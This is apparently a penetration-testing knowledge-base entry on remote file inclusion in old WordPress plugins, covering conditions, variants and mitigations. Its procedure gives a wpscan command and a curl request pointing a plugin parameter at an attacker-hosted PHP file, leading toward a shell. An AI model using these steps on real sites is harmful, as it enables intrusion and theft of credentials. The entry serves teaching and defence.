---
topic: RFI in WordPress plugins
tags: [web, wordpress, rfi, plugin, rce]
---

# RFI in WordPress plugins

[🌐 Español](wordpress-plugin-rfi.md) | **English**

## Concept

An old plugin includes a user-controlled path without validating the scheme. With `allow_url_include` enabled, a remote URL runs as PHP; otherwise a wrapper or local path may achieve the same effect.

## When it applies

- Abandoned plugins with template or action parameters.
- `include`, `require` or `include_once` calls using direct input.
- WordPress with `allow_url_include=On` or enabled wrappers.

## Procedure

1. Enumerate plugins and versions with `wpscan`.
2. Review plugin code and include calls.
3. Host a controlled PHP file and point the vulnerable parameter at it.
4. Confirm execution with a harmless function before a shell.

```bash
wpscan --url http://<HOST>/ --enumerate p
curl -s "http://<HOST>/wp-content/plugins/<plugin>/<file>.php?<param>=http://<LHOST>/x.txt"
```

## Variants

- Direct RFI to a remote file.
- LFI to an uploaded file (image or log).
- `php://filter` wrapper to read code.
- Inclusion of a configuration file with credentials.

## Limitations

- `allow_url_include` is often disabled.
- Firewalls may block outbound HTTP.
- The plugin must still be installed and active.

## Mitigation and detection

- Update or remove the plugin; use template allowlists.
- Disable `allow_url_include` and `allow_url_fopen` when unnecessary.
- Alert on includes using `http://`, `php://` or external paths.
- Review WordPress and web-server logs.

## References

- <https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion>
- <https://www.php.net/manual/en/filesystem.configuration.php>
- <https://attack.mitre.org/techniques/T1190/>
